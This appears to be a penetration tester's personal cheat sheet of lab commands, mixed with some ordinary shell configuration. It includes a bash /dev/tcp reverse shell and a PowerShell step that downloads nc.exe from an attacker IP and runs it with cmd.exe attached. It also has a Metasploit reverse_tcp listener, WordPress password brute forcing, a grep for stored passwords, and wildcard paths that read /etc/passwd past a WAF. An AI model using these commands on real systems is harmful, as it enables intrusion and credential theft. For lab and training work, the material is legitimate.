## Some commands which I used frequently 

### python command for bash 

```
python3 -c 'import pty; pty.spawn("/bin/bash")' 

python -c 'import pty; pty.spawn("/bin/bash")'

python -c 'import pty; pty.spawn("/bin/sh")' 
```

### nice script for reverse
```echo 'bash -i >& /dev/tcp/10.10.14.44/10000 0>&1' > shell.sh ; chmod +x shell.sh```

### spawn nicer shell 

```/usr/bin/script -qc /bin/bash /dev/null ```

### to get nobody removed in NFS share
```
sudo mount -t nfs -o nolock,nfsvers=3 10.1.1.72:/home home/

sudo mount -t cifs //< IP >/< SHARE > /tmp/share
```

### msf meterpreter shell listener
```
msf > use exploit/multi/handler
msf > set payload windows/meterpreter/reverse_tcp
msf > set payload windows/shell/reverse_tcp
```

### Search 
```
grep -rn './' -ie 'whatever' -B 2 -A 2

grep -rn './' -ie 'password' -B 2 -A 2
```

### nmap
```
Scan using default safe scripts         :	nmap -sV -sC 

Scan 100 most common ports (Fast)       :	nmap -F 
Scan using TCP connect                  :	nmap -sT 
Scan using TCP SYN scan (default)       :	nmap -sS 
Scan UDP ports                          :	nmap -sU -p 123,161,162 
Scan selected ports - ignore discovery	:	nmap -Pn -F 

Scan with a set of scripts (SMB)		    :	nmap -sV --script=smb* 
Scan with a set of scripts (FTP)		    :	nmap -sV --script=ftp* 

Scan with a set of scripts (smb os)		  :	nmap --script smb-os-discovery.nse -p445 

recon script VULN 						          :	nmap -Pn -p445 --script vuln -oN reconop.txt 
```

### SMB as used for msf
```
set SMB::AlwaysEncrypt false
set SMB::ProtocolVersion 1
```
### SMB as cmd
```
smbclient //1.1.1.4/ < folder name >
```
### smbmap
```
while read i; do smbmap -H $i 2>/dev/null; done < < Target IP File > | grep -v Finding | grep -v Authentication
```

### where command in win to search type of files
```
where /r c:\ proof.txt
```

### Wordpress brute force
```
wpscan --url http://10.11.1.251/wp --rua -P /usr/share/wordlists/rockyou.txt
```

### shell from powershell 
```
first upload nc

PS C:~> iwr http://10.10.14.19:7331/nc.exe -outf .\cute.exe
PS C:~> start-process -filepath .\cute.exe -argumentlist "10.10.14.9 4447 -e cmd.exe" -nonewwindow
```

### Dropbox links
```
ln -s < path of dropbox folder >  < link name > ~/data

ln -s /mnt/hgfs/2020/ ~/data
```

### file browser for jsp
```
java -jar file-browser.jar
```

### gcc
```
gcc -m32 -Wl,--hash-style=both 9542.c -o 9542
gcc -Wl,--hash-style=both -o exp
```
### rpc commands
```
rpcclient -U "" -N 10.10.10.222

> enumdomusers
> enumdomgroups
> querygroup 0x200  // query groupname
> querygroupmem 0x200 // query group members
> queryuser 0x1f4 //query users
```

### /etc/passwd WAF restriction? Use these:
```
/e?c/?asswd
/e*c/*asswd
/??c/?asswd
/??c/?assw?
```
### paths for .bashrc
```
export PATH=$PATH:/home/kali/.local/bin/
export PATH=$PATH:~/data/tools/
export PATH=$PATH:~/data/exploits/
export PATH=$PATH:~/data/myscrs/
export PATH=$PATH:/usr/opt/

export HISTCONTROL=ignoreboth:erasedups
```
### paths for .zshrc
```
export PATH=Users/repos/ringojs/bin/ringo-admin:$PATH

export PATH=/home/kali/.local/bin/:$PATH
export PATH=~/data/tools/:$PATH
export PATH=~/data/exploits/:$PATH
export PATH=~/data/myscrs/:$PATH
export PATH=/usr/opt/:$PATH
```
### dhclient by default

```
sudo nano /etc/rc.local


#!/bin/bash
dhclient
exit 0


sudo chmod 755 /etc/rc.local

sudo systemctl enable rc-local

sudo systemctl restart rc-local

sudo systemctl status rc-local
```


---END
